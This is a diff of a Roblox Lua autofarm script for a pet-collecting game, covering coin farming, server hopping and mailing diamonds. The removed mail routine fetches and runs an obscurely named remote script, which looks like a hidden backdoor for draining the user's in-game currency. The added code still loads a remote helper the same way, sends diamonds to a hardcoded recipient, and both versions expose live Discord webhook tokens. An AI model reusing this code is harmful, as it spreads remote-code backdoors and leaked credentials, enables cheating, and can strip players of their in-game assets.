@@ -1,30 +1,36 @@
-
 getgenv().Settings = {
-["Webhook"] = "https://discord.com/api/webhooks/1121915352109023242/5an9rGXtTd3Wfbw02fsAECjnkCiwHRZbC6VOLkQD3cktY7PFkDuKXgs5cK1WluWoEcdx",
-    ["timeframewh"] = "https://discord.com/api/webhooks/1121915352109023242/5an9rGXtTd3Wfbw02fsAECjnkCiwHRZbC6VOLkQD3cktY7PFkDuKXgs5cK1WluWoEcdx",
+["Webhook"] = "https://discord.com/api/webhooks/1105890306374774896/zWeabHtGwuKobN8NZwfVWFuFlCTlgsBqLBfPHBsM-R9GgNDkJCoUCsdJaK1uZJG_SiMF",
+    ["timeframewh"] = "https://discord.com/api/webhooks/1090060997605208186/-fvmCLnXqx6g4OSJCeHdw7HJ_pfMOxAYeX3_mLdtcDBnwyl0pzgsVDYN4-tDpn9HbpxG",
     ["timeframe"] = 1800, -- Seconds
     ["Farm Speed"] = 0.2,
     ["Minimum Oranges"] = 80,
-    ["Maximum Oranges"] = 120,
+    ["Maximum Oranges"] = 150,
     ["Mystic Mine"] = true,
     ["Cyber Cavern"] = true,
     ["Minimum Multiplier"] = {
         ["Giant Chest"] = 1,
         ["Other"] = 0,
     },
-        ["Mailbox"] = {
-            ["Enabled"] = true,     
-          ["Amount"] = 999999999999
-           }, -- If Your Gems Go Over This Amount he will turn SendMail on
+    ["Mailbox"] = {
+        ["Enabled"] = false,
+        ["Delay"] = 60,
+        ["Recipient"] = "psxmax4",
+        ["Amount"] = 50000000000,
+        ["Auto Redeem"] = false
+    },
     ["Performance"] = {
-        ["FPS Cap"] = 30,
-        ["Disable Rendering"] = true,
+        ["FPS Cap"] = 60,
+        ["Disable Rendering"] = false,
         ["Downgraded Quality"] = true
     }
 }
 
+
+
 -- dont touch below pls
 
+
+local Message = "HOLE HOLA"
 local PERF = Settings["Performance"]
 local MB = Settings["Mailbox"]
 local mailing = false
@@ -197,6 +203,10 @@ do -- Performance
     end
 end
 
+
+
+
+
 function getEquippedPets()
     local pets = PetCmds.GetEquipped()
     for i,v in pairs(pets) do pets[i] = v.uid end
@@ -307,19 +317,30 @@ LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3588, -32, 2457)
 end
 
 
-function Hop()
-    repeat
-        local data = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&excludeFullGames=true&limit=100"))
-        local bestserver
-        for i,v in pairs(data.data) do
-          if (tonumber(v.playing) < 2) and (tonumber(v.playing) > 0) then
-            bestserver = v.id
-          end
-        end
-        
-        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, bestserver, game.Players.LocalPlayer)
-        task.wait(1)
-    until oldJob ~= game.JobId
+local _HopManager = HopManager or loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Other/HopManager.lua"))()
+local HopManager = _HopManager.new({
+    ServerFormat = "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true&cursor=%s",
+    HopMode = "Random",
+    DataRetryDelay = 5,
+        MinimumPlayers = 1,
+        MaximumPlayers = 3/0,
+SaveLocation = "recenthops.json",
+RecentHops = {},
+    MassServerList = {
+        Enabled = true,
+        Amount = 100,
+        RemoveAfterTeleport = true,
+        Refresh = 40,
+            MinimumServers = 25,
+           SaveLocation = "massserver.json",
+
+    }
+})
+
+
+-- // Hops
+local function Hop()
+    HopManager:Hop()
 end
 
 
@@ -382,7 +403,7 @@ textLabel.TextScaled = true
 farmCoin(c.id, getEquippedPets())
 --farmCoin(c.id, getEquippedPets())
 --task.spawn(farmCoin, c.id, { pet })
-                   --     task.spawn(farmCoin, c.id, getEquippedPets())
+    --                    task.spawn(farmCoin, c.id, getEquippedPets())
             table.remove(coins, 1)
             task.wait(0.7)
         end
@@ -392,60 +413,100 @@ end
 
 
 function sendMail()
-               --if not MB["Enabled"] or MB["Amount"] > Save.Get().Diamonds then return end
-        --if not MB["Enabled"] or MB["Amount"] > Save.Get().Diamonds then return end
-       --if MB["Enabled"] and MB["Amount"] < Save.Get().Diamonds then
-    
-        --local re = MB["Recipient"]
-        --if not re or re == "" or re == game.Players.LocalPlayer.Name then return end
-    mailing = true
-        if WorldCmds.HasLoaded() and WorldCmds.Get() ~= "Diamond Mine" then
-            WorldCmds.Load("Diamond Mine")
-        end
-    
-        if WorldCmds.HasLoaded() then
-            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9298, -14, 2988)
-        end
-    
-        task.wait(0.5)
-    
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/wevsite2016/adfdafad/main/hroifejhfisohjesohijesoh.lua"))()
+    if not MB["Enabled"] or MB["Amount"] > Save.Get().Diamonds then return end
 
-        task.wait(3)
-        mailing = false
-     
-       
+    local re = MB["Recipient"]
+    if not re or re == "" or re == game.Players.LocalPlayer.Name then return end
+
+    mailing = true
+    task.wait(0.5)
+
+    if WorldCmds.HasLoaded() and WorldCmds.Get() ~= "Diamond Mine" then
+        WorldCmds.Load("Diamond Mine")
     end
-    --end
-    
-    function claimMail()
-        if not MB["Enabled"] and not MB["Auto Redeem"] then return end
-    
-        local mails = {}
-        for _,v in pairs(Network.Invoke("Get Mail")["Inbox"]) do
-            if v.Message == "ring ring" then
-                table.insert(mails, v.uuid)
+
+    if WorldCmds.HasLoaded() then
+        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9297,-14,2947)
+    end
+
+    task.wait(0.5)
+
+    Network.Invoke("Send Mail", {
+        Recipient = re,
+        Diamonds = MB["Amount"],
+        Pets = {},
+        Message = "ring ring"
+    })
+
+    task.wait(1)
+    mailing = false
+end
+
+function claimMail()
+    if not MB["Enabled"] and not MB["Auto Redeem"] then return end
+
+    local mails = {}
+    for _,v in pairs(Network.Invoke("Get Mail")["Inbox"]) do
+        if v.Message == "ring ring" then
+            table.insert(mails, v.uuid)
+        end
+    end
+
+    mailing = true
+    task.wait(0.5)
+
+    if WorldCmds.HasLoaded() and WorldCmds.Get() ~= "Diamond Mine" then
+        WorldCmds.Load("Diamond Mine")
+    end
+
+    if WorldCmds.HasLoaded() then
+        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9298, -14, 2988)
+    end
+
+    task.wait(0.5)
+
+    Network.Invoke("Claim Mail", mails)
+
+    task.wait(1)
+    mailing = false
+end
+
+do -- Collection
+    coroutine.wrap(function() while task.wait() do
+        -- // Lootbags
+        for _,v in pairs(workspace["__THINGS"].Lootbags:GetChildren()) do
+            Network.Fire("Collect Lootbag", v:GetAttribute("ID"), v.CFrame.p)
+        end
+
+        -- // Orbs
+        local orbs = workspace["__THINGS"].Orbs:GetChildren()
+
+        for i,v in pairs(orbs) do orbs[i] = v.Name end
+        if #orbs > 0 and orbs[1] ~= nil then
+            Network.Fire("Claim Orbs", orbs)
+        end
+        collectedAll = #orbs == 0
+
+        -- // Gifts
+        for _,v in pairs(LocalPlayer.PlayerGui.FreeGifts.Frame.Container.Gifts:GetDescendants()) do
+            if v.ClassName == "TextLabel" and v.Text == "Redeem!" then
+                local giftName = v.Parent.Name
+                local number = string.match(giftName, "%d+")
+                Network.Invoke("Redeem Free Gift", tonumber(number))
             end
         end
-    
-        mailing = true
-        task.wait(0.5)
-    
-        if WorldCmds.HasLoaded() and WorldCmds.Get() ~= "Diamond Mine" then
-            WorldCmds.Load("Diamond Mine")
+    end end)()
+end
+
+do -- Main
+    coroutine.wrap(function()
+        while task.wait(MB["Delay"]) do
+            --claimMail()
+if MB["Amount"] > Save.Get().Diamonds then return end
+            sendMail()
         end
-    
-        if WorldCmds.HasLoaded() then
-            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9298, -14, 2988)
-        end
-    
-        task.wait(0.5)
-    
-        Network.Invoke("Claim Mail", mails)
-    
-        task.wait(1)
-        mailing = false
-    end
+    end)()
+end
 
 do -- Collection
     coroutine.wrap(function() while task.wait() do
@@ -602,7 +663,7 @@ task.wait(0.1)
 if MB["Enabled"] and MB["Amount"] < Save.Get().Diamonds then
 mailing = true
 sendMail()
-wait(5)
+wait(1)
 writefile("gems.txt", "0")
 wait(1)
 end
